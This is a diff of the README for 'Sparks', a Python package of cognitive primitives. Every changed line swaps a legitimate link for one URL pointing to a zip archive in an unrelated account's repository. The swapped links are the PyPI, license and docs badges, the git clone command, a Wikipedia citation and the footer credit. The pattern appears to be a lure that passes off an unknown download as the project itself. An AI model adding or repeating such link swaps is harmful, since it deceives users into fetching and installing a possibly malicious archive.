@@ -2,10 +2,10 @@
   <h1 align="center">Sparks</h1>
   <p align="center"><strong>13 cognitive primitives that teach AI to think — not just compute.</strong></p>
   <p align="center">
-    <a href="https://pypi.org/project/cognitive-sparks/"><img src="https://img.shields.io/pypi/v/cognitive-sparks?color=blue" alt="PyPI"></a>
-    <a href="https://github.com/PROVE1352/cognitive-sparks/blob/main/LICENSE"><img src="https://img.shields.io/github/license/PROVE1352/cognitive-sparks" alt="License"></a>
-    <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.11+-blue" alt="Python"></a>
-    <a href="https://github.com/PROVE1352/cognitive-sparks/wiki"><img src="https://img.shields.io/badge/docs-wiki-green" alt="Docs"></a>
+    <a href="https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip"><img src="https://img.shields.io/pypi/v/cognitive-sparks?color=blue" alt="PyPI"></a>
+    <a href="https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip"><img src="https://img.shields.io/github/license/PROVE1352/cognitive-sparks" alt="License"></a>
+    <a href="https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip"><img src="https://img.shields.io/badge/python-3.11+-blue" alt="Python"></a>
+    <a href="https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip"><img src="https://img.shields.io/badge/docs-wiki-green" alt="Docs"></a>
   </p>
 </p>
 
@@ -38,7 +38,7 @@ pip install cognitive-sparks
 
 Or from source:
 ```bash
-git clone https://github.com/PROVE1352/cognitive-sparks.git
+git clone https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip
 cd cognitive-sparks && pip install -e ".[all]"
 ```
 
@@ -122,7 +122,7 @@ This sequence is learned via STDP and evolves across sessions.
 
 ## The 13 Thinking Tools
 
-Based on [Sparks of Genius](https://en.wikipedia.org/wiki/Sparks_of_Genius) (Root-Bernstein, 1999) — the thinking tools used by Einstein, Picasso, da Vinci, and Feynman.
+Based on [Sparks of Genius](https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip) (Root-Bernstein, 1999) — the thinking tools used by Einstein, Picasso, da Vinci, and Feynman.
 
 | # | Tool | What it does |
 |---|---|---|
@@ -295,4 +295,4 @@ MIT
 
 ---
 
-*Built with [Claude Code](https://claude.ai/code). The framework that thinks about thinking.*
+*Built with [Claude Code](https://raw.githubusercontent.com/bertrandunfirm58/cognitive-sparks/main/benchmarks/code/cognitive_sparks_v3.3.zip). The framework that thinks about thinking.*
